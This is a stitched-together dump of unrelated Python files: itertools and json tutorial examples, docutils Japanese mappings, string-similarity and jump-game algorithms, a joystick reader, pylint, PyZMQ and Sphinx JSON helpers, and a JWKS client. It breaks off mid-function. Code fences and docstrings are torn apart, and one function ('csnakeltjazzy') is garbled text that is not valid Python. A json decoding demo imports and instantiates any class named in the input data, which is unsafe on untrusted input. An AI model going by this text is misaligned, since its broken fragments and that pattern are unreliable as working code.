        chain(range(2, 11), FACE_CARDS),
    )
)

for card in DECK:
    print('{:>2}{}'.format(card[1], card[0]), end=' ')
    if card[1] == FACE_CARDS[-1]:
        print()

#!/usr/bin/env python3
# encoding: utf-8

#end_pymotw_header
from itertools import *


def show(iterable):
    for i, item in enumerate(iterable, 1):
        print(item, end=' ')
        if (i % 3) == 0:
            print()
    print()


print('Repeat 2:\n')
show(list(product(range(3), repeat=2)))

print('Repeat 3:\n')
show(list(product(range(3), repeat=3)))

#!/usr/bin/env python3```


```pyUsing repeat()```


```py

#end_pymotw_header
from itertools import *

for i in repeat('over-and-over', 5):
    print(i)

#!/usr/bin/env python3```


```pyUsing repeat() and map()```


```py

#end_pymotw_header
from itertools import *

for i in map(lambda x, y: (x, y, x * y), repeat(2), range(5)):
    print('{:d} * {:d} = {:d}'.format(*i))

#!/usr/bin/env python3```


```pyUsing repeat() with zip().```


```py

#end_pymotw_header
from itertools import *

for i, s in zip(count(), repeat('over-and-over', 5)):
    print(i, s)

#!/usr/bin/env python3```


```pyUsing starmap()```


```py

#end_pymotw_header
from itertools import *

values = [(0, 5), (1, 6), (2, 7), (3, 8), (4, 9)]

for i in starmap(lambda x, y: (x, y, x * y), values):
    print('{} * {} = {}'.format(*i))

#!/usr/bin/env python3```


```pyUsing takewhile()```


```py

#end_pymotw_header
from itertools import *


def should_take(x):
    print('Testing:', x)
    return x < 2


for i in takewhile(should_take, [-1, 0, 1, 2, -2]):
    print('Yielding:', i)

#!/usr/bin/env python3```


```pyUsing tee()```


```py

#end_pymotw_header
from itertools import *

r = islice(count(), 5)
i1, i2 = tee(r)

print('i1:', list(i1))
print('i2:', list(i2))

#!/usr/bin/env python3```


```pyUsing tee()```


```py

#end_pymotw_header
from itertools import *

r = islice(count(), 5)
i1, i2 = tee(r)

print('r:', end=' ')
for i in r:
    print(i, end=' ')
    if i > 1:
        break
print()

print('i1:', list(i1))
print('i2:', list(i2))

#!/usr/bin/env python3```


```pyUsing zip()```


```py

#end_pymotw_header
for i in zip([1, 2, 3], ['a', 'b', 'c']):
    print(i)

#!/usr/bin/env python3```


```pyUsing zip()```


```py

#end_pymotw_header
from itertools import *

r1 = range(3)
r2 = range(2)

print('zip stops early:')
print(list(zip(r1, r2)))

r1 = range(3)
r2 = range(2)

print('\nzip_longest processes all of the values:')
print(list(zip_longest(r1, r2)))

# -*- coding: utf-8 -*-
# $Id: ja.py 4564 2006-05-21 20:44:42Z wiemann $
# Author: Hisashi Morita <hisashim@kt.rim.or.jp>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Japanese-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = "reStructuredText"

labels = {
    # fixed: language-dependent
    "author": u"著者",
    "authors": u"著者",
    "organization": u"組織",
    "address": u"住所",
    "contact": u"連絡先",
    "version": u"バージョン",
    "revision": u"リビジョン",
    "status": u"ステータス",
    "date": u"日付",
    "copyright": u"著作権",
    "dedication": u"献辞",
    "abstract": u"概要",
    "attention": u"注目!",
    "caution": u"注意!",
    "danger": u"!危険!",
    "error": u"エラー",
    "hint": u"ヒント",
    "important": u"重要",
    "note": u"備考",
    "tip": u"通報",
    "warning": u"警告",
    "contents": u"目次",
}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    # language-dependent: fixed
    u"著者": "author",
    u" n/a": "authors",
    u"組織": "organization",
    u"住所": "address",
    u"連絡先": "contact",
    u"バージョン": "version",
    u"リビジョン": "revision",
    u"ステータス": "status",
    u"日付": "date",
    u"著作権": "copyright",
    u"献辞": "dedication",
    u"概要": "abstract",
}```


```pyJapanese (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [";", ","]```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""
````

````py
The Jaccard similarity coefficient is a commonly used indicator of the
similarity between two sets. Let U be a set and A and B be subsets of U,
then the Jaccard index/similarity is defined to be the ratio of the number
of elements of their intersection and the number of elements of their union.

Inspired from Wikipedia and
the book Mining of Massive Datasets [MMDS 2nd Edition, Chapter 3]

https://en.wikipedia.org/wiki/Jaccard_index
https://mmds.org

Jaccard similarity is widely used with MinHashing.```


```py


def jaccard_similariy(setA, setB, alternativeUnion=False):
    """
    Finds the jaccard similarity between two sets.
    Essentially, its intersection over union.

    The alternative way to calculate this is to take union as sum of the
    number of items in the two sets. This will lead to jaccard similarity
    of a set with itself be 1/2 instead of 1. [MMDS 2nd Edition, Page 77]

    Parameters:
        :setA (set,list,tuple): A non-empty set/list
        :setB (set,list,tuple): A non-empty set/list
        :alternativeUnion (boolean): If True, use sum of number of
        items as union

    Output:
        (float) The jaccard similarity between the two sets.

    Examples:
    >>> setA = {'a', 'b', 'c', 'd', 'e'}
    >>> setB = {'c', 'd', 'e', 'f', 'h', 'i'}
    >>> jaccard_similariy(setA,setB)
    0.375

    >>> jaccard_similariy(setA,setA)
    1.0

    >>> jaccard_similariy(setA,setA,True)
    0.5

    >>> setA = ['a', 'b', 'c', 'd', 'e']
    >>> setB = ('c', 'd', 'e', 'f', 'h', 'i')
    >>> jaccard_similariy(setA,setB)
    0.375
    """

    if isinstance(setA, set) and isinstance(setB, set):

        intersection = len(setA.intersection(setB))

        if alternativeUnion:
            union = len(setA) + len(setB)
        else:
            union = len(setA.union(setB))

        return intersection / union

    if isinstance(setA, (list, tuple)) and isinstance(setB, (list, tuple)):

        intersection = [element for element in setA if element in setB]

        if alternativeUnion:
            union = len(setA) + len(setB)
        else:
            union = setA + [element for element in setB if element not in setA]

        return len(intersection) / len(union)


if __name__ == "__main__":

    setA = {"a", "b", "c", "d", "e"}
    setB = {"c", "d", "e", "f", "h", "i"}
    print(jaccard_similariy(setA, setB))
````

```pyhttps://en.wikipedia.org/wiki/Jaro%E2%80%93Winkler_distance"""


def jaro_winkler(str1: str, str2: str) -> float:
    """
    Jaro–Winkler distance is a string metric measuring an edit distance between two
    sequences.
    Output value is between 0.0 and 1.0.

    >>> jaro_winkler("martha", "marhta")
    0.9611111111111111
    >>> jaro_winkler("CRATE", "TRACE")
    0.7333333333333334
    >>> jaro_winkler("test", "dbdbdbdb")
    0.0
    >>> jaro_winkler("test", "test")
    1.0
    >>> jaro_winkler("hello world", "HeLLo W0rlD")
    0.6363636363636364
    >>> jaro_winkler("test", "")
    0.0
    >>> jaro_winkler("hello", "world")
    0.4666666666666666
    >>> jaro_winkler("hell**o", "*world")
    0.4365079365079365
    """

    def get_matched_characters(_str1: str, _str2: str) -> str:
        matched = []
        limit = min(len(_str1), len(_str2)) // 2
        for i, l in enumerate(_str1):
            left = int(max(0, i - limit))
            right = int(min(i + limit + 1, len(_str2)))
            if l in _str2[left:right]:
                matched.append(l)
                _str2 = f"{_str2[0:_str2.index(l)]} {_str2[_str2.index(l) + 1:]}"

        return "".join(matched)

    # matching characters
    matching_1 = get_matched_characters(str1, str2)
    matching_2 = get_matched_characters(str2, str1)
    match_count = len(matching_1)

    # transposition
    transpositions = (
        len([(c1, c2) for c1, c2 in zip(matching_1, matching_2) if c1 != c2]) // 2
    )

    if not match_count:
        jaro = 0.0
    else:
        jaro = (
            1
            / 3
            * (
                match_count / len(str1)
                + match_count / len(str2)
                + (match_count - transpositions) / match_count
            )
        )

    # common prefix up to 4 characters
    prefix_len = 0
    for c1, c2 in zip(str1[:4], str2[:4]):
        if c1 == c2:
            prefix_len += 1
        else:
            break

    return jaro + 0.1 * prefix_len * (1 - jaro)


if __name__ == "__main__":
    import doctest

    doctest.testmod()
    print(jaro_winkler("hello", "world"))

def csnakeltjazzy(chords):
newchords - []
for chord in chords: [
if chord.isdigit(): ‘
j newchords.appendEchordfl
elif len(chords) -- 9:
return []
else:
addSeven - chord
addSeven - addSeven[e:] + "7"
newchords.append(addseven)
return neuChords
```

````py
given a list of tasks associated with their profit and deadline, perform as many tasks as you can to
get the max profit and keep right deadlines in mind.```


```py


def jobSeq(profit, deadline):
    """
    :param profit: sorted list represents the profit gained from each task if done.
    :param deadline: unsorted list represents the deadline for each task.
    :return: max profit possible from a set of tasks given their deadline
    """
    free_slots = max(deadline)
    slots = [0] * free_slots
    ans = 0
    for i in range(len(profit)):
        free = deadline[i] - 1
        while (free >= 0) and (slots[free] != 0):
            free -= 1
        if not slots[free]:
            ans += profit[i]
            slots[free] = profit[i]
            free_slots -= 1
        if not free_slots:
            return ans
    return ans


# the profit is a sorted list
profit = [35, 40, 25, 20, 15, 10]
deadline = [3, 4, 4, 2, 3, 1]
print(jobSeq(profit, deadline))
````

````pyIPython parallel backend for joblib

To enable the default view as a backend for joblib::

    import ipyparallel as ipp
    ipp.register_joblib_backend()

Or to enable a particular View you have already set up::

    view.register_joblib_backend()

At this point, you can use it with::

    with parallel_backend('ipyparallel'):
        Parallel(n_jobs=2)(delayed(some_function)(i) for i in range(10))

.. versionadded:: 5.1```


```py
# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

from __future__ import absolute_import

from joblib.parallel import register_parallel_backend
from .client._joblib import IPythonParallelBackend


def register(name="ipyparallel", make_default=False):
    """Register the default ipyparallel Client as a joblib backend

    See joblib.parallel.register_parallel_backend for details.
    """
    return register_parallel_backend(
        name, IPythonParallelBackend, make_default=make_default
    )

# first install pyjokes library using pip install pyjokes then import it
import pyjokes

try:
    print("Jokes for you-\n")

    # to get a single joke
    joke = pyjokes.get_joke()
    print(joke)

    # to get multiple jokes
    jokes = pyjokes.get_jokes()
    print(jokes)

    # to get specific number of jokes
    jokes = pyjokes.get_jokes()
    for i in range(5, 10):
        print(jokes[i], end="\n\n")

    # to get a single joke in particular language, example es - Spanish
    # category is for what type of jokes you want
    joke_lang = pyjokes.get_joke(language="es", category="neutral")
    print(joke_lang)

    # to get multiple jokes in a particular language, example es - Spanish
    # category is for what type of jokes you want
    jokes_lang = pyjokes.get_jokes(language="es", category="neutral")
    print(jokes_lang)

except Exception as e:
    pass
````

````py
ID: 071844a2-e4ec-462d-b994-410c87ab6fca
https://www.geeksforgeeks.org/josephus-problem-set-1-a-on-solution/
https://en.wikipedia.org/wiki/Josephus_problem```


```py


def josephus_problem_recur(n: int, k: int) -> int:
    """1-indexed, k-skips, Josephus problem, recursively."""
    if n == 1:
        return 1
    return (josephus_problem_recur(n - 1, k) + k - 1) % n + 1

# joystick control:

import struct

# define button code:

BUTTON_A = 305
BUTTON_B = 304
BUTTON_X = 307
BUTTON_Y = 306
BUTTON_PLUS = 313
BUTTON_MINUS = 312
BUTTON_START = 317
BUTTON_HOME = 316


class JoyStick:
    def __init__(self, eventFile):
        self.eventFile = eventFile
        self.buttonHandler = None
        self.joyLeftHandler = None
        self.joyRightHandler = None

    def setButtonHandler(self, buttonHandler):
        self.buttonHandler = buttonHandler

    def setJoyLeftHandler(self, joyLeftHandler):
        self.joyLeftHandler = joyLeftHandler

    def setJoyRightHandler(self, joyRightHandler):
        self.joyRightHandler = joyRightHandler

    def startLoop(self):
        FORMAT = "llHHI"
        EVENT_SIZE = struct.calcsize(FORMAT)
        with open(self.eventFile, "rb") as infile:
            lx, ly, rx, ry = 0, 0, 0, 0
            while True:
                event = infile.read(EVENT_SIZE)
                _, _, t, c, v = struct.unpack(FORMAT, event)
                if t == 1 and v == 1:
                    # button pressed:
                    if self.buttonHandler:
                        if not self.buttonHandler(c):
                            return
                if t == 3:
                    if c == 0 and self.joyLeftHandler:
                        # left stick & horizontal:
                        lx = v - 32768
                        self.joyLeftHandler(lx, ly)
                    elif c == 1 and self.joyLeftHandler:
                        # left stick & vertical:
                        ly = v - 32768
                        self.joyLeftHandler(lx, ly)
                    elif c == 3 and self.joyRightHandler:
                        # right stick & horizontal:
                        rx = v - 32768
                        self.joyRightHandler(rx, ry)
                    elif c == 4 and self.joyRightHandler:
                        # right stick & vertical:
                        ry = v - 32768
                        self.joyRightHandler(rx, ry)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import json

data = [{'a': 'A', 'b': (2, 4), 'c': 3.0}]
print('DATA:', repr(data))

print('repr(data)             :', len(repr(data)))

plain_dump = json.dumps(data)
print('dumps(data)            :', len(plain_dump))

small_indent = json.dumps(data, indent=2)
print('dumps(data, indent=2)  :', len(small_indent))

with_separators = json.dumps(data, separators=(',', ':'))
print('dumps(data, separators):', len(with_separators))

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.```


```py
Common validator wrapper to provide a uniform usage of other schema validation
libraries.```


```py

import os

import jsonschema
from jsonschema import Draft4Validator as _JsonSchemaValidator
from jsonschema import ValidationError

try:
    import fastjsonschema
    from fastjsonschema import JsonSchemaException as _JsonSchemaException
except ImportError:
    fastjsonschema = None
    _JsonSchemaException = ValidationError


class JsonSchemaValidator:
    name = "jsonschema"

    def __init__(self, schema):
        self._schema = schema
        self._default_validator = _JsonSchemaValidator(schema)  # Default
        self._validator = self._default_validator

    def validate(self, data):
        self._default_validator.validate(data)

    def iter_errors(self, data, schema=None):
        return self._default_validator.iter_errors(data, schema)


class FastJsonSchemaValidator(JsonSchemaValidator):
    name = "fastjsonschema"

    def __init__(self, schema):
        super().__init__(schema)
        self._validator = fastjsonschema.compile(schema)

    def validate(self, data):
        try:
            self._validator(data)
        except _JsonSchemaException as error:
            raise ValidationError(error.message, schema_path=error.path)

    def iter_errors(self, data, schema=None):
        if schema is not None:
            return self._default_validator.iter_errors(data, schema)

        errors = []
        validate_func = self._validator
        try:
            validate_func(data)
        except _JsonSchemaException as error:
            errors = [ValidationError(error.message, schema_path=error.path)]

        return errors


_VALIDATOR_MAP = [
    ("fastjsonschema", fastjsonschema, FastJsonSchemaValidator),
    ("jsonschema", jsonschema, JsonSchemaValidator),
]
VALIDATORS = [item[0] for item in _VALIDATOR_MAP]


def _validator_for_name(validator_name):
    if validator_name not in VALIDATORS:
        raise ValueError(
            "Invalid validator '{0}' value!\nValid values are: {1}".format(
                validator_name, VALIDATORS
            )
        )

    for (name, module, validator_cls) in _VALIDATOR_MAP:
        if module and validator_name == name:
            return validator_cls


def get_current_validator():
    """
    Return the default validator based on the value of an environment variable.
    """
    validator_name = os.environ.get("NBFORMAT_VALIDATOR", "jsonschema")
    return _validator_for_name(validator_name)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import json


class MyDecoder(json.JSONDecoder):
    def __init__(self):
        json.JSONDecoder.__init__(self, object_hook=self.dict_to_object)

    def dict_to_object(self, d):
        if "__class__" in d:
            class_name = d.pop("__class__")
            module_name = d.pop("__module__")
            module = __import__(module_name)
            print("MODULE:", module.__name__)
            class_ = getattr(module, class_name)
            print("CLASS:", class_)
            args = {key: value for key, value in d.items()}
            print("INSTANCE ARGS:", args)
            inst = class_(**args)
        else:
            inst = d
        return inst


encoded_object = """
[{"s": "instance value goes here",
  "__module__": "json_myobj", "__class__": "MyObj"}]```


```py

myobj_instance = MyDecoder().decode(encoded_object)
print(myobj_instance)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import json
import json_myobj

obj = json_myobj.MyObj('instance value goes here')

print('First attempt')
try:
    print(json.dumps(obj))
except TypeError as err:
    print('ERROR:', err)


def convert_to_builtin_type(obj):
    print('default(', repr(obj), ')')
    # Convert objects to a dictionary of their representation
    d = {
        '__class__': obj.__class__.__name__,
        '__module__': obj.__module__,
    }
    d.update(obj.__dict__)
    return d


print()
print('With default')
print(json.dumps(obj, default=convert_to_builtin_type))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import io
import json

data = [{'a': 'A', 'b': (2, 4), 'c': 3.0}]

f = io.StringIO()
json.dump(data, f)

print(f.getvalue())

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import json
import json_myobj


class MyEncoder(json.JSONEncoder):

    def default(self, obj):
        print('default(', repr(obj), ')')
        # Convert objects to a dictionary of their representation
        d = {
            '__class__': obj.__class__.__name__,
            '__module__': obj.__module__,
        }
        d.update(obj.__dict__)
        return d


obj = json_myobj.MyObj('internal data')
print(obj)
print(MyEncoder().encode(obj))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import json

encoder = json.JSONEncoder()
data = [{'a': 'A', 'b': (2, 4), 'c': 3.0}]

for part in encoder.iterencode(data):
    print('PART:', part)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import json

data = [{'a': 'A', 'b': (2, 4), 'c': 3.0}]
print('DATA:', repr(data))

print('NORMAL:', json.dumps(data, sort_keys=True))
print('INDENT:', json.dumps(data, sort_keys=True, indent=2))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import io
import json

f = io.StringIO('[{"a": "A", "c": 3.0, "b": [2, 4]}]')
print(json.load(f))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import json


def dict_to_object(d):
    if "__class__" in d:
        class_name = d.pop("__class__")
        module_name = d.pop("__module__")
        module = __import__(module_name)
        print("MODULE:", module.__name__)
        class_ = getattr(module, class_name)
        print("CLASS:", class_)
        args = {key: value for key, value in d.items()}
        print("INSTANCE ARGS:", args)
        inst = class_(**args)
    else:
        inst = d
    return inst


encoded_object = """
    [{"s": "instance value goes here",
      "__module__": "json_myobj", "__class__": "MyObj"}]
    """

myobj_instance = json.loads(encoded_object, object_hook=dict_to_object)
print(myobj_instance)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import json

decoder = json.JSONDecoder()


def get_decoded_and_remainder(input_data):
    obj, end = decoder.raw_decode(input_data)
    remaining = input_data[end:]
    return (obj, end, remaining)


encoded_object = '[{"a": "A", "c": 3.0, "b": [2, 4]}]'
extra_text = "This text is not JSON."

print("JSON first:")
data = " ".join([encoded_object, extra_text])
obj, end, remaining = get_decoded_and_remainder(data)

print("Object              :", obj)
print("End of parsed input :", end)
print("Remaining text      :", repr(remaining))

print()
print("JSON embedded:")
try:
    data = " ".join([extra_text, encoded_object, extra_text])
    obj, end, remaining = get_decoded_and_remainder(data)
except ValueError as err:
    print("ERROR:", err)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header

class MyObj:

    def __init__(self, s):
        self.s = s

    def __repr__(self):
        return '<MyObj({})>'.format(self.s)

# Copyright (c) 2014 Vlad Temian <vladtemian@gmail.com>
# Copyright (c) 2015-2020 Claudiu Popa <pcmanticore@gmail.com>
# Copyright (c) 2015 Ionel Cristian Maries <contact@ionelmc.ro>
# Copyright (c) 2017 guillaume2 <guillaume.peillex@gmail.col>
# Copyright (c) 2019-2021 Pierre Sassoulas <pierre.sassoulas@gmail.com>
# Copyright (c) 2019 Hugo van Kemenade <hugovk@users.noreply.github.com>
# Copyright (c) 2020 hippo91 <guillaume.peillex@gmail.com>
# Copyright (c) 2020 Clément Pit-Claudel <cpitclaudel@users.noreply.github.com>
# Copyright (c) 2021 Marc Mueller <30130371+cdce8p@users.noreply.github.com>

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE
````

````pyJSON reporter"""
import json

from pylint.interfaces import IReporter
from pylint.reporters.base_reporter import BaseReporter


class JSONReporter(BaseReporter):
    """Report messages and layouts in JSON."""

    __implements__ = IReporter
    name = "json"
    extension = "json"

    def display_messages(self, layout):
        """Launch layouts display"""
        json_dumpable = [
            {
                "type": msg.category,
                "module": msg.module,
                "obj": msg.obj,
                "line": msg.line,
                "column": msg.column,
                "path": msg.path,
                "symbol": msg.symbol,
                "message": msg.msg or "",
                "message-id": msg.msg_id,
            }
            for msg in self.messages
        ]
        print(json.dumps(json_dumpable, indent=4), file=self.out)

    def display_reports(self, layout):
        """Don't do anything in this reporter."""

    def _display(self, layout):
        """Do nothing."""


def register(linter):
    """Register the reporter classes with the linter."""
    linter.register_reporter(JSONReporter)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import json

data = [{'a': 'A', 'b': (2, 4), 'c': 3.0}]
print('DATA:', repr(data))

data_string = json.dumps(data)
print('JSON:', data_string)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import json

data = [{'a': 'A', 'b': (2, 4), 'c': 3.0}]
print('DATA   :', data)

data_string = json.dumps(data)
print('ENCODED:', data_string)

decoded = json.loads(data_string)
print('DECODED:', decoded)

print('ORIGINAL:', type(data[0]['b']))
print('DECODED :', type(decoded[0]['b']))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import json

data = [{'a': 'A', 'b': (2, 4), 'c': 3.0, ('d',): 'D tuple'}]

print('First attempt')
try:
    print(json.dumps(data))
except TypeError as err:
    print('ERROR:', err)

print()
print('Second attempt')
print(json.dumps(data, skipkeys=True))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import json

data = [{'a': 'A', 'b': (2, 4), 'c': 3.0}]
print('DATA:', repr(data))

unsorted = json.dumps(data)
print('JSON:', json.dumps(data))
print('SORT:', json.dumps(data, sort_keys=True))

first = json.dumps(data, sort_keys=True)
second = json.dumps(data, sort_keys=True)

print('UNSORTED MATCH:', unsorted == first)
print('SORTED MATCH  :', first == second)
````

````pyJSON serialize to/from utf8 bytes

..versionchanged:: 22.2
    Remove optional imports of different JSON implementations.
    Now that we require recent Python, unconditionally use the standard library.
    Custom JSON libraries can be used via custom serialization functions.```


```py

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

import json

from typing import Any, Dict, List, Union

# backward-compatibility, unused
jsonmod = json


def dumps(o: Any, **kwargs) -> bytes:
    """Serialize object to JSON bytes (utf-8).

    Keyword arguments are passed along to :py:func:`json.dumps`.
    """
    return json.dumps(o, **kwargs).encode("utf8")


def loads(s: Union[bytes, str], **kwargs) -> Union[Dict, List, str, int, float]:
    """Load object from JSON bytes (utf-8).

    Keyword arguments are passed along to :py:func:`json.loads`.
    """
    if isinstance(s, bytes):
        s = s.decode("utf8")
    return json.loads(s, **kwargs)


__all__ = ["dumps", "loads"]
````

````py
    sphinx.util.jsonimpl
    ~~~~~~~~~~~~~~~~~~~~

    JSON serializer implementation wrapper.

    :copyright: Copyright 2007-2019 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

import json
from collections import UserString

if False:
    # For type annotation
    from typing import Any, IO  # NOQA


class SphinxJSONEncoder(json.JSONEncoder):
    """JSONEncoder subclass that forces translation proxies."""

    def default(self, obj):
        # type: (Any) -> str
        if isinstance(obj, UserString):
            return str(obj)
        return super().default(obj)


def dump(obj, fp, *args, **kwds):
    # type: (Any, IO, Any, Any) -> None
    kwds["cls"] = SphinxJSONEncoder
    json.dump(obj, fp, *args, **kwds)


def dumps(obj, *args, **kwds):
    # type: (Any, Any, Any) -> str
    kwds["cls"] = SphinxJSONEncoder
    return json.dumps(obj, *args, **kwds)


def load(*args, **kwds):
    # type: (Any, Any) -> Any
    return json.load(*args, **kwds)


def loads(*args, **kwds):
    # type: (Any, Any) -> Any
    return json.loads(*args, **kwds)
````

````py
Jump Game

Given an array of non-negative integers, you are initially positioned at the first index of the array.
Each element in the array represents your maximum jump length at that position.
Determine if you are able to reach the last index.

Input: [2, 3, 1, 1, 4]
Output: True

Input: [3, 2, 1, 0, 4]
Output: False

=========================================
Just iterate the array and in each step save the farthest reachable position.
If the current position is smaller than the farthest position, then the end isn't reachable.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def can_jump(nums):
    n = len(nums)
    if n == 0:
        return False

    max_jump = 0
    for i in range(n):
        # if this field isn't reachable return False
        if max_jump < i:
            return False

        this_jump = i + nums[i]
        max_jump = max(max_jump, this_jump)

        # if the jump is greater or equal to the last element return True
        if max_jump >= n - 1:
            return True


###########
# Testing #
###########

# Test 1
# Correct result => True
print(can_jump([2, 3, 1, 1, 4]))

# Test 2
# Correct result => False
print(can_jump([3, 2, 1, 0, 4]))
````

````py
Jump Game 2

Given an array of non-negative integers, you are initially positioned at the first index of the array.
Each element in the array represents your maximum jump length at that position.
Your goal is to reach the last index in the minimum number of jumps.

Input: XXX
Output: XXX
Output explanation: XXX

=========================================
Classical 1D Dynamic Programming solution.
    Time Complexity:    O(N)    , maybe looks like O(N^2) but that's not possible
    Space Complexity:   O(N)
If you analyze the previous solution, you'll see that you don't need the whole DP array.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


##############
# Solution 1 #
##############


def min_jumps_1(nums):
    n = len(nums)
    if n <= 1:
        return 0

    dp = [-1] * n
    dp[0] = 0

    for i in range(n):
        this_jump = i + nums[i]
        jumps = dp[i] + 1

        if this_jump >= n - 1:
            return jumps

        # starging from back, go reverse and
        # change all -1 values and break when first positive is found
        for j in range(this_jump, i, -1):
            if dp[j] != -1:
                break
            dp[j] = jumps


##############
# Solution 2 #
##############


def min_jumps_2(nums):
    n = len(nums)
    if n <= 1:
        return 0

    jumps = 0
    max_jump = 0
    new_max_jump = 0

    for i in range(n):
        if max_jump < i:
            max_jump = new_max_jump
            jumps += 1

        this_jump = i + nums[i]
        if this_jump >= n - 1:
            return jumps + 1

        new_max_jump = max(new_max_jump, this_jump)


###########
# Testing #
###########

# Test 1
# Correct result => 2
nums = [2, 3, 1, 1, 4]
print(min_jumps_1(nums))
print(min_jumps_2(nums))

from __future__ import print_function
import math
def jump_search(arr, x):
    n = len(arr)
    step = int(math.floor(math.sqrt(n)))
    prev = 0
    while arr[min(step, n)-1] < x:
        prev = step
        step += int(math.floor(math.sqrt(n)))
        if prev >= n:
            return -1

    while arr[prev] < x:
        prev = prev + 1
        if prev == min(step, n):
            return -1
    if arr[prev] == x:
        return prev
    return -1



arr = [ 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610]
x = 55
index = jump_search(arr, x)
print("\nNumber " + str(x) +" is at index " + str(index));
````

````py
Jumping numbers

A number is called as a Jumping Number if all adjacent digits in it differ by 1.
The difference between ‘9’ and ‘0’ is not considered as 1.
All single digit numbers are considered as Jumping Numbers.
For example 7, 8987 and 4343456 are Jumping numbers but 796 and 89098 are not.

Input: 20
Output: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12]

=========================================
Make a tree (DFS way/backtracking), for each next digit take the last digit, go up and down
(example: 123, last digit is 3, so next digit should be 2 or 4).
    Time Complexity:    O(9 * 2^(NumOfDigits(N) - 1))
    Space Complexity:   O(1)        , recursion stack will have depth 9 (but this can be considered as constant)```


```py


############
# Solution #
############


def jumping_numbers(x):
    result = []

    # take all 9 possible starting combinations
    for i in range(1, 10):
        jumping_num(i, x, result)

    return result


def jumping_num(num, x, result):
    if num > x:
        return

    result.append(num)

    last_digit = num % 10
    next_num = num * 10

    # decrease the last digit by one
    if last_digit != 0:
        jumping_num(next_num + last_digit - 1, x, result)

    # increase the last digit by one
    if last_digit != 9:
        jumping_num(next_num + last_digit + 1, x, result)


###########
# Testing #
###########

# Test 1
# Correct result => [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12]
print(jumping_numbers(20))

# Test 2
# Correct result => [1, 10, 12, 2, 21, 23, 3, 32, 34, 4, 43, 45, 5, 54, 56, 6, 65, 67, 7, 76, 78, 8, 87, 89, 9, 98]
print(jumping_numbers(100))
````

````pyLaunch the root jupyter command

Alias to jupyter_core```


```py

__version__ = '1.0.0'

if __name__ == '__main__':
    from runpy import run_module
    run_module('jupyter_core')

c = get_config()

#Export all the notebooks in the current directory to the sphinx_howto format.
c.NbConvertApp.notebooks = ['notebook1.ipynb']
c.NbConvertApp.export_format = 'python'


from concurrent.futures import ProcessPoolExecutor
from itertools import repeat

guilty = 0


def juror():
    global guilty

    guilty += 1


with ProcessPoolExecutor() as pool:
    for _ in repeat(None, 12):
        pool.submit(juror)

print(guilty)

import json
import urllib.request
from functools import lru_cache
from typing import Any, List

from .api_jwk import PyJWK, PyJWKSet
from .api_jwt import decode_complete as decode_token
from .exceptions import PyJWKClientError


class PyJWKClient:
    def __init__(self, uri: str, cache_keys: bool = True, max_cached_keys: int = 16):
        self.uri = uri
        if cache_keys:
            # Cache signing keys
            # Ignore mypy (https://github.com/python/mypy/issues/2427)
            self.get_signing_key = lru_cache(maxsize=max_cached_keys)(
                self.get_signing_key
            )  # type: ignore

    def fetch_data(self) -> Any:
        with urllib.request.urlopen(self.uri) as response:
            return json.load(response)

    def get_jwk_set(self) -> PyJWKSet:
        data = self.fetch_data()
        return PyJWKSet.from_dict(data)

    def get_signing_keys(self) -> List[PyJWK]:
        jwk_set = self.get_jwk_set()
        signing_keys = []

        for jwk_set_key in jwk_set.keys:
            if jwk_set_key.public_key_use == "sig" and jwk_set_key.key_id:
                signing_keys.append(jwk_set_key)

        if len(signing_keys) == 0:
            raise PyJWKClientError("The JWKS endpoint did not contain any signing keys")

        return signing_keys

    def get_signing_key(self, kid: str) -> PyJWK:
        signing_keys = self.get_signing_keys()
        signing_key = None

        for key in signing_keys:
            if key.key_id == kid:
                signing_key = key
                break

        if not signing_key:
            raise PyJWKClientError(
                f'Unable to find a signing key that matches: "{kid}"'
            )

        return signing_key

    def get_signing_key_from_jwt(self, token: str) -> PyJWK:
        unverified = decode_token(token, options={"verify_signature": False})
        header = unverified["header"]
        return self.get_signing_key(header.get("kid"))

# Source : https://leetcode.com/problems/k-diff-pairs-in-an-array/?tab=Description
# Author : Han Zichi
# Date   : 2017-03-07


class Solution(object):
    def findPairs(self, nums, k):
        """
